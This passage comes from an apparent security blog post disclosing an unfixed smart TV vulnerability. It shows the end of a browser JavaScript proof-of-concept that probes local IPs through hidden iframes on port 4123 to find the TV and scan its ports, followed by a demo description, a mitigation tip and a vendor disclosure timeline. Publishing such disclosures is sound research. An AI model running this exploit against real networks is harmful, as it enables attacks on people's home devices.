                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">lowEnd</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="nx">highEnd</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">ports</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nx">ports</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="kd">function</span> <span class="nf">scan</span><span class="p">(</span><span class="nx">ips</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">ips</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">ifrm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
                    <span class="nx">ifrm</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://</span><span class="dl">"</span><span class="o">+</span><span class="nx">ips</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span><span class="o">+</span><span class="dl">"</span><span class="s2">:4123</span><span class="dl">"</span><span class="p">);</span>
                    <span class="nx">ifrm</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">width</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">10px</span><span class="dl">"</span><span class="p">;</span>
                    <span class="nx">ifrm</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">height</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">10px</span><span class="dl">"</span><span class="p">;</span>
                    <span class="nx">ifrm</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="nx">ips</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
                    <span class="nx">ifrm</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">iframes</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">querySelectorAll</span><span class="p">(</span><span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">);</span>
                        <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">iframes</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nx">iframes</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">parentNode</span><span class="p">.</span><span class="nf">removeChild</span><span class="p">(</span><span class="nx">iframes</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
                        <span class="p">}</span>
                        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">tv_ip</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
                        <span class="nf">scan_tv_ports</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">id</span><span class="p">);</span>
                    <span class="p">};</span>
                    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">ifrm</span><span class="p">);</span>
                    <span class="nf">setTimeout</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
                        <span class="k">this</span><span class="p">.</span><span class="k">continue</span><span class="p">;</span>
                    <span class="p">},</span> <span class="mi">50</span><span class="p">);</span> 
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/body</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/html</span><span class="err">&gt;
</span></code></pre></div></div>

<hr />

<h3 id="example">Example</h3>

<p>The following example is accelerated. The full port scan phase can take up to 5 - 10 minutes. However, it‚Äôs because the PoC is not optimized for speed.</p>

<p><img src="/assets/img/2021/03/exploit-poc.gif" alt="" title="Proof of Concept Exploit" /></p>

<p>If the attacker is already in the same network as the smart TV, it would be much faster and easier to use Nmap or something like that.</p>

<hr />

<p>Honestly, I didn‚Äôt have much time to do even a network scan or motivation to reverse engineer the firmware, but I believe there is much more to uncover. It would be an excellent topic for further research. I guess it‚Äôs just a matter of time until we see the first <strong>Smart TV Exploit Kit</strong>.</p>

<p>I decided to drop this one as a 0day since I couldn‚Äôt convince the vendor to release a fix in the past 90 days. Users can move smart appliances to a separate VLAN to be safe. Other than that, the TV itself is not that bad, and I‚Äôm somewhat satisfied with the purchase.</p>

<h3 id="timeline">Timeline</h3>

<ul>
  <li>December 8th, 2020 ~ I bought a TV, found a vulnerability</li>
  <li>December 8th, 2020 ~ Reached to the support via the contact form on the vendors‚Äô website</li>
  <li>December 8th, 2020 ~ Sent emails to a couple of vendors‚Äô email addresses</li>
  <li>December 11th, 2020 ~ Wrote a working Proof of Concept exploit</li>
  <li>December 11th, 2020 ~ Sent an email to an address found on a different vendors‚Äô website</li>
  <li>December 11th, 2020 ~ Received a response and discussed the findings</li>
  <li>December 22nd, 2020 ~ I received a response that the ports can‚Äôt be closed, and it‚Äôs most likely a won‚Äôt-fix issue</li>
  <li>March 11th, 2021 ~ Published a responsible disclosure report (90 days since the initial response)</li>
</ul>



  <small>tags: <em>0day</em> - <em>exploit</em> - <em>dos</em> - <em>smart-tv</em></small>



      </section>
    </div>

    <hr>
    
    
    Content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a><br />
    &#127279; 2019&dash;2026 - <strong>@vavkamil</strong> - <a href="https://github.com/vavkamil/vavkamil.cz" target="_blank">Open-source</a> Github pages - Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> &amp; <a href="https://github.com/pages-themes/hacker" target="_blank">The Hacker theme</a> - Subscribe via <a href="http://localhost:4000/feed.xml">RSS</a>
  </body>
</html>
